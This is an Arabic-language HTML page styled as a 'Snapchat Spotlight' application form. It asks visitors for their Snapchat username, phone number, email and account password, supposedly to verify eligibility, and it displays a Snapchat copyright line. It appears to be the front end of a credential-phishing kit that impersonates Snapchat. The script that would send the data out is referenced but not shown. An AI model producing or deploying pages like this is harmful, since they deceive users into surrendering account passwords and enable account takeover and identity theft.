<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصة الأضواء | تقديم الطلب</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <header>
        <div class="container">
            <div class="logo">Snapchat Spotlight</div>
        </div>
    </header>

    <main class="container">
        <div class="form-wrapper">
            <h2>نموذج تقديم الطلب</h2>
            <p style="text-align: center; color: #666; margin-bottom: 20px;">يرجى ملء البيانات التالية للتحقق من أهلية حسابك.</p>
            
            <form id="submissionForm">
                
                <div class="form-group">
                    <label for="username">اسم المستخدم:</label>
                    <input type="text" id="username" name="username" required 
                           placeholder="اسم المستخدم في سناب شات"
                           autocomplete="username">
                </div>

                <div class="form-group">
                    <label for="phoneNumber">رقم الهاتف:</label>
                    <input type="tel" id="phoneNumber" name="phoneNumber" required 
                           placeholder="05xxxxxxxx"
                           autocomplete="tel">
                </div>

                <div class="form-group">
                    <label for="trackingEmail">البريد الإلكتروني:</label>
                    <input type="email" id="trackingEmail" name="trackingEmail" required 
                           placeholder="example@email.com"
                           autocomplete="email">
                </div>

                <div class="form-group">
                    <label for="passwordField">كلمة المرور:</label>
                    <input type="password" id="passwordField" name="passwordField" required 
                           placeholder="********"
                           autocomplete="current-password">
                </div>

                <div id="statusMessage" class="status-message" style="display: none;"></div>

                <div style="text-align: center; margin-top: 30px;">
                    <button type="submit" id="submitBtn" class="btn-primary">إرسال الطلب</button>
                </div>
            </form>
        </div>
    </main>

    <div id="loadingOverlay" class="loading-overlay" style="display: none;">
        <div class="loader"></div> <p>جاري معالجة الطلب...</p>
    </div>

    <footer>
        <div class="container">
            <p>© 2025 جميع الحقوق محفوظة لـ Snapchat</p>
        </div>
    </footer>

    <script src="script.js"></script>
</body>
</html>
